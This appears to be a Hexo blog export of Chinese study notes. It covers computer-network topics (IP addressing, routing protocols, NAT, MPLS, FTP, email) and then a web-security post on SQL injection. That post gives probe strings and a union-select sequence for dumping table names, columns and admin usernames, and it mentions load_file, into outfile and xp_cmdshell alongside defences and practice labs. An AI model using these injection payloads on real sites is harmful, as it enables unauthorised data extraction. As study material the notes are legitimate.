class="table-container"><table><thead><tr><th>类别</th><th>网络号</th><th>主机号</th><th>第1个网络号</th><th>最后网络号</th></tr></thead><tbody><tr><td>A</td><td>8b（0开）</td><td>24b</td><td>1</td><td>126</td></tr><tr><td>B</td><td>16b（10开）</td><td>16b</td><td>128.1</td><td>191.255</td></tr><tr><td>C</td><td>24b（110开）</td><td>8b</td><td>192.0.1</td><td>223.255.255</td></tr><tr><td>D</td><td>1110开</td><td>多播地址</td><td></td><td></td></tr><tr><td>E</td><td>1111开</td><td>保留</td><td></td></tr></tbody></table></div><blockquote><p>A类中网络号0表示本网络，127表示本地环回测试地址；B类中128.0被保留；C类192.0.0保留（B、C类在后面的CIDR中可以使用）</p></blockquote><div class="table-container"><table><thead><tr><th>网络号</th><th>主机号</th><th>源</th><th>目的</th><th>意思</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>可以</td><td>不可</td><td>本网络上本主机（DHCP）</td></tr><tr><td>0</td><td>X</td><td>可</td><td>N</td><td>本网络上主机号为X的主机</td></tr><tr><td>全1</td><td>全1</td><td>N</td><td>Y</td><td>只在本网络进行广播</td></tr><tr><td>S</td><td>全1</td><td>N</td><td>Y</td><td>对网络号为Y的网络中进行广播</td></tr><tr><td>127</td><td>非全0或全1</td><td>Y</td><td>Y</td><td>本地软件环回测试</td></tr></tbody></table></div><ol><li><p>划分子网—三级IP地址：【网络号+子网号+主机号】</p><ul><li><p>仍有ABC类之分，子网号从主机号位数中拿取</p></li><li><p>子网掩码：网络号等长位置全1，主机号等长全0；与IP地址相&amp;得到网络地址</p></li><li>路由表中除了目的网络地址还要有该网络的子网掩码</li></ul></li><li><p>CIDR—无分类域间路由选择：【网络前缀+主机号】</p><ul><li>没有了ABC之分，这种编址方式也叫<em>构造超网</em>，但还是无法解决IP缺少的问题。</li><li>VLSM：变长子网掩码，一个划分子网的网络中可同时使用几个不同的子网掩码</li><li><strong>斜线记法</strong>a.b.c.d/n，表明前n位是网络前缀，前缀越短，地址块包含地址越大。</li><li>子网掩码：又叫地址掩码，即32位，点分十进制表示的网络前缀。</li><li>地址块：网络前缀都相同的所有连续IP地址，每个地址块中地址数一定是2的整数次幂</li></ul></li></ol><p><strong>IP层分组转发</strong>：特定路由？——最长前缀匹配？——默认路由？——丢弃</p><ul><li><p>路由聚合：使用网络前缀减少路由表中的相近条目；路由聚合地址表【目的网络，下一跳】</p></li><li><p>基于终点的转发：基于分组首部中的目的地址传送和转发</p></li><li><p>最长前缀匹配：使用CIDR查找转发表时，选择前缀最长的一个作为匹配的前缀</p><blockquote><p>两种特殊路由：主机路由，对特定目的主机的IP地址专门指明的一个路由，a.b.c.d/32，放在转发表最前面；默认路由，都由指定路由器处理，0.0.0.0/0表示</p></blockquote></li><li><p>二叉线索查找转发表：自顶向下最多32层，每层对应IP地址中的一位，可以用唯一前缀构造该线索二叉</p></li></ul><p><strong>IP数据报</strong>首部：</p><ol><li><p>4B-IP协议版本+4B-首部长度+8B-区分服务（一般不用）+16B-IP数据报总长度</p></li><li><p>16B-标识（计数器）+3B-标志（MF-DF-保留）+13B-片偏移（本部分数据在原分组中的偏移，8字节为单位）</p><blockquote><p>MF=1，表示后面还有分片；DF=0才允许分片</p></blockquote></li><li><p>8B-生存时间（可通过的路由器数最大值TTL）+8B-协议（数据部分协议）+16B-首部检验和</p><blockquote><p>| 协议 | ICMP | IGMP | IP   | TCP  | UDP  | IPv6 | ICMP-v6 | OSPF |<br>| —— | —— | —— | —— | —— | —— | —— | ———- | —— |<br>| 字段 | 1    | 2    | 4    | 6    | 17   | 41   | 58      | 89   |</p><p>发送端：数据报<strong>首部</strong>每16位一单位（此时检验和当0），反码后求和，再取反码得到检验和</p><p>接收端再拿着检验和计算，反码求和，若0则保留，否则丢弃</p></blockquote></li><li><p>32B-源地址+32B目的地址+（可选部分+填充，一定是32B的倍数）</p></li><li><p>数据部分</p></li></ol><h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><p>允许主机或路由器报告差错情况和提供有关异常情况的报告。ICMP报文封装于IP数据报中，但属于IP层协议。</p><p><strong>ICMP报文格式</strong>：8b-类型+8b-代码+16b-检验和+（16b-标识符+16b-序列号+数据部分）</p><p><strong>ICMP报文类型</strong>：</p><div class="table-container"><table><thead><tr><th>报文种类</th><th>类型值</th><th>意思</th></tr></thead><tbody><tr><td><strong>差错报文</strong></td><td>3</td><td>终点不可达</td></tr><tr><td>多播特殊地址不发</td><td>11</td><td>时间超过</td></tr><tr><td>对ICMP不发ICMP</td><td>15</td><td>参数问题</td></tr><tr><td>仅第一个分片</td><td>5</td><td>改变路由</td></tr><tr><td><strong>询问报文</strong></td><td>8或0</td><td>回送请求或回答</td></tr><tr><td></td><td>13或14</td><td>时间戳请求或回答</td></tr></tbody></table></div><p><strong>应用</strong>：<code>ping</code>命令（应用层）直接使用网络层测试两个主机的连通性；<code>tracert</code>命令跟踪一个分组路径。</p><h4 id="ARP地址解析协议"><a href="#ARP地址解析协议" class="headerlink" title="ARP地址解析协议"></a>ARP地址解析协议</h4><p><strong>ARP高速缓存</strong>：已知一个IP，用来找MAC</p><ul><li>存放IP地址到MAC地址的映射表</li><li>映射表动态更新（新增或超时删除）</li><li>映射表<IP地址；MAC地址；生存时间；类型></li></ul><p><strong>ARP工作</strong>：A在自己的ARP高速缓冲中找B的IP地址，找到后取出MAC并写入MAC帧；没找到则A在本局域网中广播发送ARP请求，之后由目标B向A单播ARP响应分组</p><blockquote><p>请求分组：<A的MAC；A的IP；B的MAC（未知全0）；B的IP>。响应分组类似</p></blockquote><p><strong>ARPcache作用</strong>：</p><ul><li>解决同一个局域网上的主机或路由器的IP和MAC地址的映射关系—动态更新</li><li>减少ARP广播的通信量（请求分组与响应分组会被记入缓冲中）</li><li>存放最近获得的IP地址到MAC地址的绑定。</li></ul><p><strong>ARP使用的四种情况</strong>：</p><ol><li>发送方是主机，要把IP数据报发送到<strong>本网络</strong>上另一个主机：用ARP找——目标主机MAC</li><li>发送到<strong>另一个网</strong>上的一个主机：ARP找到本网络的路由器的硬件地址，剩下交给路由器</li><li>发送方<strong>路由器</strong>，要把IP数据报传给<strong>本网络</strong>上一个主机：使用ARP找——目标主机MAC</li><li>IP数据报发给<strong>另一个网</strong>上另一个主机：ARP找到本网络上<strong>另一个路由器的硬件地址</strong>，再交给路由器</li></ol><h4 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h4><p>主要是解决IP枯竭的问题，将协议数据单元PDU称为分组；支持即插即用，无需使用DHCP；首部长度必须是8B的整数倍；支持资源的预分配</p><p><strong>数据报格式</strong>：基本首部+有效载荷（净负荷=[扩展首部]+数据部分）</p><ul><li><p>40B的基本首部：4b-版本+8b通信量类+24b-流标号+16b-有效载荷长度+8b-下一个首部+8b-跳数限制+128b-源地址+128b-目标地址</p><blockquote><p>版本指明协议版本；通信量类区分不同数据报的优先级；流标号指明该数据流编号，同一流下数据报共享一个标号；下一个首部相当于IPv4的协议字段；</p></blockquote></li></ul><p><strong>基本类型</strong>：单播（点对点）、多播（一对多）、任播（终点是一组，但只能有一个收到）</p><p><strong>冒号十六进制记法</strong>：每个地址128位，8×4×hex；零压缩技术（一串连续的0可用一对冒号取代）、点分十进制记法的后缀（用来由4向6转换）</p><div class="table-container"><table><thead><tr><th>地址类型</th><th>二进制前缀</th><th>IPv6记法</th></tr></thead><tbody><tr><td>未指明地址</td><td>00…0（128b）</td><td>::/128</td></tr><tr><td>环回地址</td><td>00…1（仅此一个）</td><td>::1/128</td></tr><tr><td>多播地址</td><td>11111111（8位）</td><td>FF00::/8</td></tr><tr><td>本地链路单播地址</td><td>1111111010（10位）未连接到互联网</td><td>FE80::/10</td></tr><tr><td>全球单播地址</td><td>除上述四种之外所有</td></tr></tbody></table></div><blockquote><p>单播地址划分：【子网前缀+接口标识符】、【全球路由选择前缀+子网标识符+接口标识符】</p></blockquote><p><strong>v4向v6过渡</strong>：双协议栈（路由器提供v6和v4数据报的转换）或者隧道技术（将v6作为内容包在v4数据包之中）</p><p><strong>ICMPv6</strong>：差错报文、信息报文、邻站发现报文ND、组成员关系报文MLD</p><h3 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h3><p>互联网采用<strong>自适应（动态）、分布式</strong>路由选择协议。将整个互联网划分为许多较小的自治系统AS，采用分层次的路由选择协议，即自治系统之间的路由选择协议（域间路由选择=外部网关协议）和自治系统内部的路由选择（内部网关协议=域内路由选择）</p><blockquote><p>自治系统AS：每一个AS对其他AS表现出的是一个单一的和一致的路由选择策略</p></blockquote><h4 id="内部网关协议IGP"><a href="#内部网关协议IGP" class="headerlink" title="内部网关协议IGP"></a>内部网关协议IGP</h4><p><strong>RIP-距离向量算法-应用层</strong></p><p>分布式、基于距离向量的路由选择；互联网标准协议；每个路由器都要维护从他自己到其他每个目的网络的距离记录。坏消息传得慢</p><ul><li><p>距离/跳数：路由器到直接连接的网络距离=1，到非直接连接的网络距离=经过的路由数+1</p></li><li><p>好路由=距离短，不关注时间，一条路最多15个路由器，16=不可到达，只选择距离最短路由</p></li></ul><p><strong>三个特点</strong>：仅和相邻路由交换信息、交换自己路由表、固定时间间隔30s交换</p><p>路由表建立：空的—交换直接连接的—若干更新—收敛完成</p><blockquote><p>收敛：自治系统中所有结点都得到正确的路由选择信息的过程；坏消息传得慢</p></blockquote><p><strong>RIP报文处理</strong>：采用距离向量算法</p><ul><li>对收到来自X的RIP报文中的路由表，下一跳地址都改为X，距离++</li><li>——本地路由表中没有的目的网络则全部添加</li><li>——本地有目标网络，但下一跳为X的话，就用收到的替换</li><li>——若下一跳不是X，且本地表距离更远则更新</li><li>180s还没收到X的更新，则把X记为不可达，距离设置为16</li></ul><p><strong>RIP2报文</strong>：支持CIDR，使用UDP端口520传送；由首部+路由构成</p><blockquote><p>首部-4B：命令+版本+0；一条路由-20B：地址标识符+路由标记+网络地址+子网掩码+下一跳路由地址+距离（1-16，但占4B）；最多25个路由信息，多的额外报文传送</p></blockquote><p><strong>OSPF-链路状态算法-网络层</strong></p><p>原理简单实现复杂；迪杰斯特拉的最短路径算法SPF；分布式的链路状态协议；目前采用v2版本；将自治系统化为主干区域（路由器BR）和区域（边界路由器ASBR）</p><p><strong>三个特点</strong>：洪泛法向所有本AS路由器发送信息、发送相邻链路状态、每隔一长段时间或链路状态变换再泛洪</p><blockquote><p>链路状态：说明本路由器和哪些路由器相邻，以及链路的度量/权重</p></blockquote><p><strong>其他特点</strong>：可实现负载均衡、OSPF路由具有鉴别功能、支持可变长度的子网划分和CIDR、序号空间大、根据权重计算不同的路由</p><p><strong>五种分组类型</strong>：问候分组、数据库描述分组、链路状态的请求、更新、确认分组</p><p><strong>格式</strong>：用IP数据报传送，包括24B的分组首部+具体分组内容</p><p><strong>工作过程</strong>：确定邻站可达—同步链路状态数据库—更新链路状态（30min左右）</p><h4 id="外部网关协议BGP"><a href="#外部网关协议BGP" class="headerlink" title="外部网关协议BGP"></a>外部网关协议BGP</h4><p>目前使用BGP-4，一种不同自治系统的路由器之间的交换路由信息的协议，路径向量算法-应用层</p><ul><li>不同自治系统之间由BGP发言者（边界路由器）交换信息，在半永久性TCP链接（179端口）建立BGP会话，也叫做eBGP连接在（不同AS之间交换路由协议）；AS内部，iBGP连接。</li><li>AS内部运行IGP或iBGP，AS之间运行eBGP</li><li>eBGP连接的两端可以互相通报；iBGP对等信息不能双向</li><li>路由信息【前缀,BGP属性】=【前缀,AS路径,下一跳】，不允许相同AS号出现</li></ul><p><strong>不同类型AS</strong>：末梢AS（树叶）；多归属AS（同时连接到两个或以上的AS）；穿越AS（为其他AS有偿转发）；对等AS（事先商量的两个AS，彼此之间不收费）</p><p><strong>路由选择</strong>：本地偏好值最高的路由（默认100）——AS跳数最小的路由——热土豆路由算法（分组在AS内转发次数最小）——路由器BGP ID数值最小的路由。</p><p><strong>四种类型</strong>：打开（与另一个BGP发言者建立关系）、更新、保活（周期性证实邻站连同）、通知（发送检测到的差错）</p><p><strong>格式</strong>：16B标记+2B长度+1B类型+报文主体部分</p><p><strong>路由器结构</strong>：路由选择结构-软件+分组转发部分-硬件；工作在网络层；主要用于转发分组；</p><ul><li>转发仅涉及一个路由器，将用户的IP数据报从合适端口转发出去，是从路由表得出来的；路由选择涉及到多个路由器，路由表一般仅包含目的网络到下一跳的映射</li><li>输入：收到的分组是交换路由信息的分组则送交路由选择处理机，数据分组则按照目的地址查找转发表经交换结构到达合适的输出端口，若某分组正在查找则排队等待</li><li><p>输出：从交换结构接受分组。传来的速率&gt;输出链路发送速率就缓存在队列中，满了则丢弃后面的</p></li><li><p>交换结构：</p><ul><li>通过存储器：收到分组就中断通知，之后复制到存储器</li><li>总线：共享的总线，不需要预处理机，若总线忙则排队；受总线速率影响</li><li>纵横交换结构：2N条总线，水平线与垂直线，定位到对应出口上</li></ul></li></ul><h3 id="IP多播-组播"><a href="#IP多播-组播" class="headerlink" title="IP多播/组播"></a>IP多播/组播</h3><ul><li>互联网上进行多播就叫IP多播，因为是一对多，只能用于目的地址；发送一次数据到多播组，由多播路由器则复制传输</li><li>多播数据报中需要写入多播组的标识符，标识符就是D类地址，只能用于目的地址</li><li>包装的IP协议字段=2，表明使用网际组管理协议IGMP，最大努力交付，无ICMP差错报文</li><li>硬件多播：01-00-5E-00-00-00到01-00-5E-7F-FF-FF（前25位不变）</li></ul><p><strong>IGMP</strong>：让多播路由器知道多播组成员信息。动态适应变化，考虑数据报的来源与去向。使用IP数据包传递报文。</p><p><strong>IGMP工作</strong>：加入多播组（新人主动发送IGMP，之后由多播路由器转发给其他路由器）——探询组成员变化情况（多播路由器周期性试探组，组内有一台机器响应即可，否则不活跃，不再转发给其他多播路由器）</p><p><strong>多播路由选择</strong>方法：洪泛与剪除、隧道技术、基于核心的发现技术</p><ul><li><p>洪泛与剪除：使用较小的多播组；开始时洪泛（采用反向路径广播RPB避免兜圈子）</p><blockquote><p>RBP：经最短路径转发来的转发，否则丢弃（检查）。长度相同的则选择IP地址最小的。这样就形成了<strong>多播转发树</strong>，某个路由器下游树枝没有多播组成员则一并剪除（剪枝），有某个树枝新增组成员则再介入到该转发树（嫁接）</p></blockquote></li><li><p>隧道技术：适用于地理上很分散的情况；</p></li><li><p>基于核心的发现：多播组大小在较大范围内变化；每个多播组指定一个核心路由器，并给出它的IP单播地址</p><blockquote><p>路由器1发出多播数据报到一个多播组，则多播组就向其成员转发该数据报；若是请求加入多播组的数据报，则该核心路由器就用隧道技术向1转发每一个多播数据报的副本</p></blockquote></li></ul><p><strong>多播路由选择协议</strong>：距离向量多播路由选择协议DVMRP、基于核心的转发树CBT、开放最短通路优先的多播扩展MOSPF、协议无关多播-稀疏方式PIM-SM、协议无关多播-密集方式PIM-DM</p><h3 id="VPN与NAT"><a href="#VPN与NAT" class="headerlink" title="VPN与NAT"></a>VPN与NAT</h3><p>采用专门IP地址的互联网络叫专用网，专门IP地址即仅在机构内部使用的IP地址，路由器对目的地址是专用地址的数据报一律不进行转发</p><p><strong>三个专用IP地址块</strong>：10.0.0.0/8；172.16.0.0/12；192.168.0.0/16</p><p><strong>专用网</strong>：用于机构内部的通信，并借助互联网作为两个专用网之间的载体，即VPN-虚拟专用网（数据必加密，两边必须有专门软硬件）</p><ul><li><p>内联网：同一个机构内部的网路构成的VPN</p></li><li><p>外联网：一个机构和某些外部机构共同建立的</p></li><li><p>远程接入VPN：外部建立VPN隧道访问公司内部网络</p></li></ul><p><strong>NAT</strong>：一种安装在上述特殊硬件上的软件，用于网络地址转换，至少一个全网IP和内网IP</p><ul><li><p>地址转换表【出—源IP—旧的IP—新的IP】【入—目的IP—旧IP—新IP】</p></li><li><p>传统NAT：NAT路由器n个公网IP，则专用网内最多n个主机接入（或者轮流使用）</p></li><li><p>网络地址与端口号转换<strong>NAPT</strong>：可以使多台拥有本地地址的主机，共用一个公网IP，P代表运输层的TCP端口号；</p></li></ul><h3 id="MPLS"><a href="#MPLS" class="headerlink" title="MPLS"></a>MPLS</h3><p>多协议标签交换技术，建立基于标签的转发路径（虚路径），使得MPLS网络中的路由器在<strong>转发报文</strong>时不必再<strong>查找数目庞大的网络层路由条目</strong>，而是<strong>根据标签来转发分组</strong>。</p><ul><li><p>MPLS上层可有多种协议，IPv4、IPv6、IPX，也可以使用多种链路层协议，PPP、以太网、ATM以及帧中继等。利用面向连接的技术，使每个分组携带一个叫做标签的小整数（固定长度），让标签路由器用标签值检索转发表，从而实现在链路层用<strong>硬件</strong>快速转发（标签交换）</p></li><li><p>封装位置：网络层与数据链路层之间，即IP数据报之前加一个MPLS首部之后再封装为以太网帧</p></li><li><p>MPLS域：该域中有许多彼此相邻的路由器，并且所有路由器都是支持MPLS技术的标记交换路由器LSR（标记交换-快速转发，路由选择-构造转发表）</p></li><li><p><strong>工作过程</strong>：</p><ul><li><p>各LSR使用标签分配协议LDP交换报文，找出和标签对应的标签交换路径LSP。</p></li><li><p>入口节点给IP数据报打上标签（插入MPLS首部）即分类，并按照转发表转发给下一个LSR</p><blockquote><p>首部=20b标签位+3b保留位+1b栈位+8b生存时间TTL</p></blockquote></li><li><p>LSR转发并更新标记（入标记改为出标记，也叫做标签对换）</p></li><li><p>分组离开MPLS域时，出口节点把分组的标签去除</p></li></ul></li><li><p>转发等价类FEC：一组具有相同转发处理方式的分组；传统IP转发中，到同一个目的地址的所有报文就是一个FEC，而FEC的划分可以由管理员控制！（可以实现路经的人工配置）</p></li></ul><p>因为MPLS的复杂维护难，且无法做到基于时延或带宽等要求的流量调度，于是新一代MPLS，段路由选择协议SR，需要借助下面的SDN控制器给分组分配SR标签，指明分组从原点到终点的路径</p><p><strong>SDN</strong>：软件定义网络，将控制层和数据层分开，使用软件控制数据层面的设备，OpenFlow作为两层之间的通信接口。</p><p><strong>OpenFlow</strong>：SDN远程控制器通过一个安全信道，使用OpenFlow协议远程管理，OpenFlow交换机中的流表，该表规定了“匹配+动作”，即如何进行字段匹配以及之后的操作</p><blockquote><p>流表中的一项：首部字段值（匹配字段）+计数器（已匹配分组数）+动作</p></blockquote><h2 id="计网第五章：传输层"><a href="#计网第五章：传输层" class="headerlink" title="计网第五章：传输层"></a>计网第五章：传输层</h2><blockquote><p>之后把网络与web中的tcp和udp搬到这里</p></blockquote><h2 id="计网第六章：应用层"><a href="#计网第六章：应用层" class="headerlink" title="计网第六章：应用层"></a>计网第六章：应用层</h2><blockquote><p>主要讲解web中没有涉及到的</p></blockquote><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>文件传输协议，允许客户指明文件的类型与格式，适合在异构网络、异构架构的任意计算机之间传送文件，而且能够通过anonymous用户提供公用文件夹共享的能力。</p><p>采用C/S工作方式，依赖于TCP，使用21端口来控制连接，20端口来进行数据连接。</p><blockquote><p>这种分离的控制连接，称FTP的控制信息是“带外”传送的</p></blockquote><p>工作流程：</p><ol><li>服务器监听21号端口，等待连接；主进程收到请求后，由从进程负责处理单个请求</li><li>在21端口建立好TCP连接之后，创建数据传送进程和数据连接，有两种模式<ul><li>主动模式PORT：客户端随机开放一个端口与服务端的20端口相连，传送数据</li><li>被动模式PASV：服务端随机开放一个端口告知客户端进行相连</li></ul></li></ol><blockquote><p>网络文件系统NFS：允许进程打开一个远程文件，可以从某个特定位置开始读写，而无需读取整个大文件</p></blockquote><h3 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h3><p>邮件客户端=用户代理，用户代理通过SMTP协议将邮件发送到己方的邮件服务器A上，之后A通过SMTP协议发送邮件到目标邮件服务器B上，接收人的用户代理通过POP3协议将邮件从B拉取到本地进行读取</p><ul><li>SMTP：即简单邮件传输协议，专用于“推”——即发送邮件，建立于TCP之上，25端口</li></ul><blockquote><p>MIME：多用途因特网邮件扩展，因为原本的SMTP只支持7位ASCII码文本邮件，该扩展可以将原本的非ASCII码转换为ASCII码，从而能够正常传送</p></blockquote><ul><li><p>POP3：邮局协议，专用于“拉”——即读取邮件，建立于TCP，110端口。有两种工作模式，下载并保留和下载并删除</p></li><li><p>IMAP：因特网报文存取协议，也是用于读取邮件。它为用户提供了创建文件夹、文件夹之间移动邮件、在远程文件夹中查询邮件等功能，还可以只读取报文的某些部分，节省带宽</p></li></ul><blockquote><p>此外有些还可以通过HTTP发送接收邮件，邮件服务器之间还是用SMTP传送</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 408 </tag>
            
            <tag> Web </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全</title>
      <link href="/2023/09/18/Web%E5%AE%89%E5%85%A8/"/>
      <url>/2023/09/18/Web%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>原理：用户输入的数据未经过滤被SQL解释器执行；扫描、注入工具：SqlMap、Pangolin（穿山甲）、Havij、BSQL Hacker、The Mole；使用单双引号或<code>\</code>来检测是否报错；靶场：sqli-labs</p><h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><ol><li>数字型注入：输入参数为整数；会出现在ASP、PHP等弱类型语言中，对于Java、C#等强类型语言难以自动将字符串推导为string类型</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="operator">/</span>一定为错，检查是否存在<span class="keyword">SQL</span>注射点</span><br></pre></td></tr></table></figure><ol><li>字符型注入：输入参数为字符串，数字类型不需要单引号闭合，字符串类型一般需要单引号闭合</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin &#x27;</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--&#x27;//‘--’为注释</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>Mysql的注释风格为“#”、“<span class="comment">--”、“/* */”</span></span><br></pre></td></tr></table></figure><ol><li><p>cookie/POST注入：注入字段在cookie、POST的数据中</p></li><li><p>盲注：不返回错误的注入，布尔盲注，只能通过返回的true/false来判断；</p><p>时间/延时盲注，只会返回true，所以需要延时函数<code>sleep(n)</code>进行判断;DNSlog注入，使用dns发送，并非get、post等（需要使用UNC路径-仅windows）</p></li><li><p>base64注入：注入的字符串经过base64加密</p></li><li><p>二次注入攻击：特殊字符转义</p></li></ol><h4 id="防范SQL注入"><a href="#防范SQL注入" class="headerlink" title="防范SQL注入"></a>防范SQL注入</h4><ol><li>使用强类型语言；对于弱类型语言加入判断数据类型的函数</li><li>特殊字符进行转义，可以参考OWASP ESAPI</li><li>预编译语言：Java中的三个接口Statement、CallableStatement、PreparedStatement</li><li>框架技术：需要尽量减少字符串的动态拼接</li></ol><h4 id="数据库软件说明"><a href="#数据库软件说明" class="headerlink" title="数据库软件说明"></a>数据库软件说明</h4><ol><li>SQL Server</li></ol><p>数据库表：</p><div class="table-container"><table><thead><tr><th>数据库视图</th><th>说明</th></tr></thead><tbody><tr><td>sys.databases</td><td>SQL Server中所有数据库</td></tr><tr><td>sys.sql_logins</td><td>所有的登录名</td></tr><tr><td>information_schema.tables</td><td>当前用户数据库中的表</td></tr><tr><td>information_schema.columns</td><td>~列</td></tr><tr><td>sys.database_principals</td><td>数据库中每个权限</td></tr></tbody></table></div><p>数据库函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> suser_name();<span class="operator">/</span><span class="operator">/</span>返回用户的登录标识名</span><br><span class="line">   db_name();<span class="operator">/</span><span class="operator">/</span>返回数据库名称</span><br><span class="line">   <span class="keyword">convert</span>(<span class="type">int</span>,<span class="string">&#x27;5&#x27;</span>);<span class="operator">/</span><span class="operator">/</span>数据类型转换</span><br><span class="line">   stuff();<span class="operator">/</span><span class="operator">/</span>字符串截取</span><br></pre></td></tr></table></figure><p>数据库存储过程：</p><div class="table-container"><table><thead><tr><th>过程</th><th>解释</th></tr></thead><tbody><tr><td>sp_dropuser</td><td>从当前数据库中删除数据库用户</td></tr><tr><td>xp_regread</td><td>读取注册表</td></tr><tr><td>xp_regdeletevalue</td><td>删除注册表</td></tr><tr><td>xp_dirtree</td><td>读取目录</td></tr><tr><td>sp_password</td><td>更改密码</td></tr><tr><td>xp_servicecontrol</td><td>停止或激活某服务</td></tr><tr><td>xp_cmdshell</td><td>允许用户执行操作系统命令</td></tr></tbody></table></div><ol><li>MySQL在5.0以上有information_schema表</li></ol><p>注释：<code>#</code>注释一行、<code>--</code>行尾、<code>/**/</code>注释块、<code>;%00</code>后跟注释</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> SCHEMA_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.SCHEMATA LIMIT <span class="number">0</span>,<span class="number">1</span>;#查询用户数据库名称</span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>(<span class="keyword">select</span> DATABASE()) limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">#查询当前数据库</span><br><span class="line"><span class="keyword">select</span> CLOUMN_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;Student&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line">#查询指定表所有字段</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">判断字符还是数字注入</span><br><span class="line">?id=1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1 or 1=1</span><br><span class="line">判断列数：</span><br><span class="line">?id=1 order by 1/2/3/...</span><br><span class="line">判断注入点：</span><br><span class="line">?id=-1 union select 1</span><br><span class="line">?id=-1 union select 1,2 limit 1</span><br><span class="line">查看数据库：</span><br><span class="line">?id=-1 union select 1,datebase()</span><br><span class="line">查看表名字：</span><br><span class="line">?id=-1 union select 1,group_contact(table_name) from information_schema_tables where table_schema=&#x27;news&#x27;</span><br><span class="line">查看列名：</span><br><span class="line">?id=-1 union select 1,group_contact(column_name) from information_schema,columns where table_name=&#x27;admin&#x27;</span><br><span class="line">查看字段：</span><br><span class="line">?id=-1 union select 1,group_contact(username) from admin</span><br></pre></td></tr></table></figure><p>函数利用：</p><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>load_file()</td><td>读取文件，绝对路径，小于规定字节（默认16MB）</td></tr><tr><td>into outfile</td><td>写文件，同上</td></tr><tr><td>hex/unhex</td><td>转十六进制/hex的反向操作</td></tr><tr><td>@@datadir</td><td>返回数据库路径</td></tr><tr><td>@@basedir</td><td>MySQL安装路径</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td></tr><tr><td>concat()</td><td>字符串合并</td></tr></tbody></table></div><ol><li>Oracle</li></ol><p>与前面两种一样，具有元数据视图（存放表的信息的表）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_roles#当前用户权限</span><br><span class="line"><span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>#当前数据库版本</span><br></pre></td></tr></table></figure><p>Oracle包=包的规范（接口）+包体（具体实现）；<code>UTL_HTTP</code>对http的操作、<code>UTL_FILE</code>专门操作I/O</p><hr><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><p>只要允许上传头像文件等就可能存在该漏洞；一般POST上传过程：客户端JS检测扩展名—服务端MIME类型检测—服务端目标路径检测path—服务端文件内容检测；靶场:upload-labs；原因如下：</p><ol><li>服务器配置不当</li><li>开源文本编辑器上传漏洞</li><li>文件解析漏洞导致执行</li><li>过滤不严格或者被绕过</li></ol><h4 id="文件解析漏洞"><a 